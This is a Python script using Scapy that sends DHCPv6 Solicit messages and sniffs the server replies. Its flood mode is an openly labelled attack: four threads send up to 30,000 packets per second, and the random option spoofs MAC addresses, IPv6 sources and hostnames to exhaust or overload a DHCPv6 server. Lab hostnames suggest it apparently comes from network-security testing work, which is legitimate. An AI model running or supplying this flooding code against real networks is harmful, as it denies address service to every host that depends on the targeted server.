#!/usr/bin/python3
import argparse
import logging
import multiprocessing
import random
import socket
import sys
import threading
import time
import uuid
from collections import Counter

import netifaces
from scapy.arch import get_if_hwaddr
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6OptElapsedTime, DHCP6OptClientId, DUID_LLT, DHCP6OptIA_NA, \
    DHCP6OptRapidCommit, DUID_LL, DUID_UUID, DHCP6OptClientFQDN, DHCP6OptOptReq, DHCP6_Advertise, DHCP6OptIAAddress, \
    DHCP6OptDNSServers, DHCP6OptDNSDomains, DHCP6_Reply, DHCP6_Reconf, DHCP6_Request, DHCP6OptServerId
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendpfast, sendp, srp1, sniff

from validate_parameters import mac2ipv6, is_valid_ipv6, is_valid_mac, is_valid_num

# Turning off logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def parameter():
    parser = argparse.ArgumentParser(description="Sending DHCPv6 Solicit messages to a target with option Rapid "
                                                 "commit and flooding.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1:2"
                                                                            " if skipping)")
    parser.add_argument("-rc", dest="rapid_commit", action="store_true", default=False,
                        help="activate the Rapid Commit for immediate Reply from server instead of Advertise messages")
    parser.add_argument("-trid", dest="trid", action="store", type=int, help="the transaction ID")
    parser.add_argument("-duid", dest="duid", action="store", choices=['LL', 'LLT', 'UUID'], default='LLT',
                        help="the type of Client Identifier (DUID-LLT, DUID-LL or DUID-UUID)")
    parser.add_argument("-fqdn", dest="fqdn", action="store", help="the client fully qualified domain name (resolved "
                                                                   "from socket if skipping)")
    parser.add_argument("-iaid", dest="iaid", action="store", type=int,
                        help="the Identity Association for Non-temporary address (randomized if skipping)")
    parser.add_argument("-req", dest="request", action="store_true", default=False,
                        help="allow host to send Request message to succeed in getting information from servers")
    parser.add_argument("-p", dest="period", type=int, action="store", help="send the Solicit messages periodically "
                                                                            "every defined seconds")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending Solicit messages using only the defined addresses ("
                             "constant), or sending Solicit messages with many random addresses")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][
            len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6]) - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::1:2"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the transaction ID
    if args.trid is None:
        args.trid = random.randint(10000, 2 ** 24)
    if args.trid is not None:
        if not is_valid_num(args.trid):
            print("---> The given transaction ID is invalid. Try again!!!")
            sys.exit(1)

    # Validate the client fully qualified domain name
    if args.fqdn is None:
        args.fqdn = socket.gethostname() + ". "

    # Validate the Identity Association for Non-temporary address
    if args.iaid is None:
        args.iaid = random.randint(10000, 2 ** 32)
    if args.iaid is not None:
        if not is_valid_num(args.iaid):
            print("---> The given IAID is invalid. Try again!!!")
            sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    return args.interface, args.source_mac, args.source_ip, args.destination_ip, args.rapid_commit, args.trid, args.iaid, args.duid, args.fqdn, args.request, args.period, args.flood


def generate(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period,
             flood):
    # Generate the packet
    layer2 = Ether(dst="33:33:00:01:00:02", src=source_mac)
    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
    layer4 = UDP(sport=546, dport=547)
    dhcpv6_solicit = DHCP6_Solicit(trid=trid)
    packet1 = layer2 / layer3 / layer4 / dhcpv6_solicit

    if rapid_commit:
        packet1 /= DHCP6OptRapidCommit()
    dhcpv6_OptIANA = DHCP6OptIA_NA(iaid=iaid)
    packet1 /= dhcpv6_OptIANA

    if duid == "LLT":
        dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_LLT(timeval=int(time.time()), lladdr=source_mac))
    if duid == "LL":
        dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_LL(lladdr=source_mac))
    if duid == "UUID":
        dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_UUID(uuid=uuid.uuid1()))
    packet1 /= dhcpv6_OptClientId / DHCP6OptClientFQDN(flags='S', fqdn=fqdn) / DHCP6OptOptReq(
        reqopts=[23, 24, 31, 39, 52, 82]) / DHCP6OptElapsedTime()

    if period is None and flood is None:
        print("Sending DHCPv6 Solicit message to destination: ", destination_ip)
        sendp(packet1, verbose=False, iface=interface)
    if period is not None:
        print("Sending DHCPv6 Solicit message every " + str(period) + " second(s) to the destination: ",
              destination_ip + " (press Ctrl+C to stop the process).....")
        sendp(packet1, verbose=False, iface=interface, inter=period, loop=1)
    if flood is not None:
        pkt_list = []
        print("Flooding the destination: " + destination_ip + " with DHCPv6 Solicit messages (press Ctrl+C to stop the "
                                                              "attack).....")
        if flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)

        if flood == "random":
            for i in range(100):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(dst="33:33:00:01:00:02", src=random_mac)
                layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
                layer4 = UDP(sport=546, dport=547)
                dhcpv6_solicit = DHCP6_Solicit(trid=random.randint(20000, 2 ** 24))
                packet1 = layer2 / layer3 / layer4 / dhcpv6_solicit

                if rapid_commit:
                    packet1 /= DHCP6OptRapidCommit()
                dhcpv6_OptIANA = DHCP6OptIA_NA(iaid=random.randint(20000, 2 ** 32))
                packet1 /= dhcpv6_OptIANA

                if duid == "LLT":
                    dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_LLT(timeval=int(time.time()), lladdr=random_mac))
                if duid == "LL":
                    dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_LL(lladdr=random_mac))
                if duid == "UUID":
                    dhcpv6_OptClientId = DHCP6OptClientId(duid=DUID_UUID(uuid=uuid.getnode()))

                names = ['macos. ', 'kali. ', 'desktop. ', 'ubuntu. ', 'centos. ', 'fekt. ', 'fit. ', 'fsi. ', 'fast. ',
                         'ceitec. ', 'six. ', 'vut. ']
                packet1 /= dhcpv6_OptClientId / DHCP6OptClientFQDN(flags='S', fqdn=random.choice(names)) / \
                           DHCP6OptOptReq(reqopts=[23, 24, 31, 39, 52, 82]) / DHCP6OptElapsedTime()
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


def sniffing(interface, source_mac, source_ip, destination_ip, fqdn, request):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].dst == source_ip:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            if DHCP6_Advertise in packet:
                print("+ Received DHCPv6 Advertise message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))

                if request:  # Sending back request message to complete the process
                    layer2 = Ether(dst="33:33:00:01:00:02", src=source_mac)
                    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
                    layer4 = UDP(sport=546, dport=547)
                    dhcpv6_request = DHCP6_Request(trid=packet[DHCP6_Advertise].trid)
                    packet2 = layer2 / layer3 / layer4 / dhcpv6_request
                    if DHCP6OptServerId in packet:
                        dhcpv6_serverId = DHCP6OptServerId(duid=packet[DHCP6OptServerId].duid)
                        packet2 /= dhcpv6_serverId
                    if DHCP6OptClientId in packet:
                        dhcpv6_clientId = DHCP6OptClientId(duid=packet[DHCP6OptClientId].duid)
                        packet2 /= dhcpv6_clientId
                    if DHCP6OptIA_NA in packet:
                        dhcpv6_iana = DHCP6OptIA_NA(iaid=packet[DHCP6OptIA_NA].iaid, ianaopts=packet[DHCP6OptIA_NA].ianaopts)
                        packet2 /= dhcpv6_iana
                    packet2 /= DHCP6OptClientFQDN(flags='S', fqdn=fqdn) / DHCP6OptOptReq(reqopts=[23, 24, 31, 39, 52, 82]) / DHCP6OptElapsedTime()
                    print("===> Sending DHCPv6 Request message to the destination: " + packet[0][1].src)
                    sendp(packet2, verbose=False, iface=interface)
                print("-----------------------------------------------------------------------------------")
            if DHCP6_Reply in packet:
                print("+ Received DHCPv6 Reply message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(
                        packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))
                print("-----------------------------------------------------------------------------------")
            if DHCP6_Reconf in packet:
                print("+ Received DHCPv6 Reconfigure message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(
                        packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))
                print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "udp and (port 546 or 547)"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action, timeout=2.5)
    except KeyboardInterrupt:
        sys.exit(0)


def sniffing_forever(interface, source_mac, source_ip, destination_ip, fqdn, request):
    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].dst == source_ip:
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            if DHCP6_Advertise in packet:
                print("+ Received DHCPv6 Advertise message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(
                        packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))

                if request:  # Sending back request message to complete the process
                    layer2 = Ether(dst="33:33:00:01:00:02", src=source_mac)
                    layer3 = IPv6(src=source_ip, dst=destination_ip, hlim=1)
                    layer4 = UDP(sport=546, dport=547)
                    dhcpv6_request = DHCP6_Request(trid=packet[DHCP6_Advertise].trid)
                    packet2 = layer2 / layer3 / layer4 / dhcpv6_request
                    if DHCP6OptServerId in packet:
                        dhcpv6_serverId = DHCP6OptServerId(duid=packet[DHCP6OptServerId].duid)
                        packet2 /= dhcpv6_serverId
                    if DHCP6OptClientId in packet:
                        dhcpv6_clientId = DHCP6OptClientId(duid=packet[DHCP6OptClientId].duid)
                        packet2 /= dhcpv6_clientId
                    if DHCP6OptIA_NA in packet:
                        dhcpv6_iana = DHCP6OptIA_NA(iaid=packet[DHCP6OptIA_NA].iaid, ianaopts=packet[DHCP6OptIA_NA].ianaopts)
                        packet2 /= dhcpv6_iana
                    packet2 /= DHCP6OptClientFQDN(flags='S', fqdn=fqdn) / DHCP6OptOptReq(reqopts=[23, 24, 31, 39, 52, 82]) / DHCP6OptElapsedTime()
                    print("===> Sending DHCPv6 Request message to the destination: " + packet[0][1].src)
                    sendp(packet2, verbose=False, iface=interface)
                print("-----------------------------------------------------------------------------------")
            if DHCP6_Reply in packet:
                print("+ Received DHCPv6 Reply message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(
                        packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))
                print("-----------------------------------------------------------------------------------")
            if DHCP6_Reconf in packet:
                print("+ Received DHCPv6 Reconfigure message number #" + str(sum(packet_counts.values())))
                print("     from IPv6 address: " + packet[0][1].src + " and MAC address: " + packet[0].src)
                if DHCP6OptIAAddress in packet:
                    print("     with proposed IPv6 address: " + str(packet[DHCP6OptIAAddress].addr))
                    print("     with preferred lifetime (" + str(
                        packet[DHCP6OptIAAddress].preflft) + "s) and valid Lifetime ("
                          + str(packet[DHCP6OptIAAddress].validlft) + "s)")
                if DHCP6OptDNSServers in packet:
                    print("     with address of DNS server: " + str(packet[DHCP6OptDNSServers].dnsservers))
                if DHCP6OptDNSDomains in packet:
                    print("                with DNS domain: " + str(packet[DHCP6OptDNSDomains].dnsdomains))
                print("-----------------------------------------------------------------------------------")

    # Setup sniff, filtering for IP traffic to see the result
    build_filter = "udp and (port 546 or 547)"

    try:
        sniff(iface=interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


def execute_functions(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood])
    p2 = multiprocessing.Process(target=sniffing, args=[interface, source_mac, source_ip, destination_ip, fqdn, request])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


def execute_functions_forever(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood):
    p1 = multiprocessing.Process(target=generate, args=[interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood])
    p2 = multiprocessing.Process(target=sniffing_forever, args=[interface, source_mac, source_ip, destination_ip, fqdn, request])
    p2.start()
    p1.start()
    p2.join()
    p1.join()


if __name__ == "__main__":
    interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood = parameter()
    if flood is None and period is None:
        try:
            execute_functions(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    elif period is not None:
        try:
            execute_functions_forever(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood)
        except KeyboardInterrupt:
            sys.exit(0)
    else:
        try:
            generate(interface, source_mac, source_ip, destination_ip, rapid_commit, trid, iaid, duid, fqdn, request, period, flood)
        except KeyboardInterrupt:
            # If KeyboardInterrupt is raised in the main thread, stop all child threads
            threading.Event().set()
            sys.exit(0)
